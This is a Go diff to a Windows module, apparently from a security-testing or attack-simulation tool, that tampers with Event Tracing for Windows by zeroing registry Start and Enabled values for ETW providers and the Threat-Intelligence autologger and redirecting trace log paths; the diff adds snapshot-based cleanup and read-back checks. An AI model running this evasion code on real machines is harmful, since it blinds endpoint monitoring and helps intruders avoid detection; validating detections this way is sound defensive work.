@@ -1,3 +1,5 @@
+//go:build windows
+
 package modules
 
 import (
@@ -40,10 +42,10 @@ func (m *disableETWTamperModule) Run() RawResult {
 		details = append(details, "ETW real-time consumers disabled")
 	}
 
-	// Technique 3: Set ETW session trace file to invalid path
+	// Technique 3: Redirect ETW trace output to an invalid path
 	if m.corruptETWTraceFiles() {
 		disabledCount++
-		details = append(details, "ETW trace files corrupted")
+		details = append(details, "ETW trace log path redirected to a non-existent file")
 	}
 
 	// Technique 4: Disable Microsoft-Windows-Threat-Intelligence specifically
@@ -85,10 +87,18 @@ func (m *disableETWTamperModule) disableETWProvidersDirect() bool {
 			continue
 		}
 
-		// Disable by setting Start = 0
+		// Disable by setting Start = 0. Snapshot first so cleanup can restore,
+		// and read the value back so "disabled" means disabled rather than
+		// "a registry write returned no error".
+		snapshotDWORD(path, "Start")
 		err = k.SetDWordValue("Start", 0)
+		if err != nil {
+			k.Close()
+			continue
+		}
+		val, _, readErr := k.GetIntegerValue("Start")
 		k.Close()
-		if err == nil {
+		if readErr == nil && val == 0 {
 			return true
 		}
 	}
@@ -109,21 +119,35 @@ func (m *disableETWTamperModule) disableETWRealTimeConsumers() bool {
 			continue
 		}
 
+		snapshotDWORD(path, "Start")
 		err = k.SetDWordValue("Start", 4)
+		if err != nil {
+			k.Close()
+			continue
+		}
+		val, _, readErr := k.GetIntegerValue("Start")
 		k.Close()
-		if err == nil {
+		if readErr == nil && val == 4 {
 			success = true
 		}
 	}
 	return success
 }
 
-// corruptETWTraceFiles sets ETW trace file paths to invalid locations
+// corruptETWTraceFiles redirects ETW autologger trace output to a
+// non-existent path.
+//
+// This does not corrupt or delete any trace file — it only rewrites a
+// registry string. The previous wording ("ETW trace files corrupted")
+// overstated what happened, which matters because the finding is read as
+// evidence of ETW tampering.
 func (m *disableETWTamperModule) corruptETWTraceFiles() bool {
 	tracePaths := []string{
 		`SYSTEM\CurrentControlSet\Control\WMI\Autologger\Microsoft-Windows-Threat-Intelligence`,
 		`SYSTEM\CurrentControlSet\Control\WMI\Autologger\Circular Kernel Context Logger`,
 	}
+
+	const bogusPath = `C:\Windows\Temp\invalid_etw_trace.etl`
 
 	for _, path := range tracePaths {
 		k, err := registry.OpenKey(registry.LOCAL_MACHINE, path, registry.ALL_ACCESS)
@@ -131,9 +155,17 @@ func (m *disableETWTamperModule) corruptETWTraceFiles() bool {
 			continue
 		}
 
-		err = k.SetStringValue("LogFilePath", `C:\Windows\Temp\invalid_etw_trace.etl`)
+		// Snapshot so the original LogFilePath is restored during cleanup.
+		snapshotString(path, "LogFilePath")
+
+		err = k.SetStringValue("LogFilePath", bogusPath)
+		if err != nil {
+			k.Close()
+			continue
+		}
+		val, _, readErr := k.GetStringValue("LogFilePath")
 		k.Close()
-		if err == nil {
+		if readErr == nil && val == bogusPath {
 			return true
 		}
 	}
@@ -155,17 +187,21 @@ func (m *disableETWTamperModule) disableThreatIntelligenceETW() bool {
 			continue
 		}
 
-		// Disable via multiple methods
+		// Disable via multiple methods. Snapshot each value first so cleanup
+		// can restore whatever this module changes.
+		snapshotDWORD(path, "Start")
 		err = k.SetDWordValue("Start", 0)
 		if err == nil {
 			success = true
 		}
 
+		snapshotDWORD(path, "Enabled")
 		err = k.SetDWordValue("Enabled", 0)
 		if err == nil {
 			success = true
 		}
 
+		snapshotString(path, "LogFilePath")
 		err = k.SetStringValue("LogFilePath", `C:\Windows\Temp\invalid_etw_trace.etl`)
 		if err == nil {
 			success = true
@@ -178,4 +214,3 @@ func (m *disableETWTamperModule) disableThreatIntelligenceETW() bool {
 	}
 	return false
 }
-
